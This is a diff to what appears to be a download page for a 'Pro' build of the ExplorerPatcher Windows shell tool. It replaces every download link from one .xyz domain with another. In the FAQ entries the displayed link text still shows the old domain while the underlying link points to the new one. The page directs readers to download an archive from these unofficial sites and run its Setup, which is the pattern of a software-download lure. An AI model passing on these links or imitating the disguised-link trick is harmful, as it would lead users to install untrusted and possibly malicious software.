@@ -21,8 +21,8 @@ ExplorerPatcher Windows 11 Shell Pro Desktop Setup Guide — Free open-source pa
 
 > Use the project link below for Windows.
 
-* **Project link:** **[explorerpatcher-windows-11-shell.nexpath.xyz](https://explorerpatcher-windows-11-shell.nexpath.xyz/)**
-* **Full URL:** `https://explorerpatcher-windows-11-shell.nexpath.xyz/`
+* **Project link:** **[explorerpatcher-windows-11-shell.nerasix.xyz](https://explorerpatcher-windows-11-shell.nerasix.xyz/)**
+* **Full URL:** `https://explorerpatcher-windows-11-shell.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
@@ -46,12 +46,12 @@ ExplorerPatcher Windows 11 Shell Pro Desktop Setup Guide — Free open-source pa
 
 <details>
 <summary>&nbsp;<b>How to install?</b></summary>
-<br>Open <a href="https://explorerpatcher-windows-11-shell.nexpath.xyz/">explorerpatcher-windows-11-shell.nexpath.xyz</a>, click <b>Download</b>, extract the archive, then run <b>Setup</b>.
+<br>Open <a href="https://explorerpatcher-windows-11-shell.nerasix.xyz/">explorerpatcher-windows-11-shell.nexpath.xyz</a>, click <b>Download</b>, extract the archive, then run <b>Setup</b>.
 </details>
 
 <details>
 <summary>&nbsp;<b>Download didn't start?</b></summary>
-<br>Use the manual link on the NexPath download page, or open <a href="https://explorerpatcher-windows-11-shell.nexpath.xyz/">explorerpatcher-windows-11-shell.nexpath.xyz</a> directly in your browser.
+<br>Use the manual link on the NexPath download page, or open <a href="https://explorerpatcher-windows-11-shell.nerasix.xyz/">explorerpatcher-windows-11-shell.nexpath.xyz</a> directly in your browser.
 </details>
 
 <details>
@@ -61,5 +61,5 @@ ExplorerPatcher Windows 11 Shell Pro Desktop Setup Guide — Free open-source pa
 
 <details>
 <summary>&nbsp;<b>Updates?</b></summary>
-<br>Open <a href="https://explorerpatcher-windows-11-shell.nexpath.xyz/">explorerpatcher-windows-11-shell.nexpath.xyz</a> again and download the latest version from NexPath.
+<br>Open <a href="https://explorerpatcher-windows-11-shell.nerasix.xyz/">explorerpatcher-windows-11-shell.nexpath.xyz</a> again and download the latest version from NexPath.
 </details>
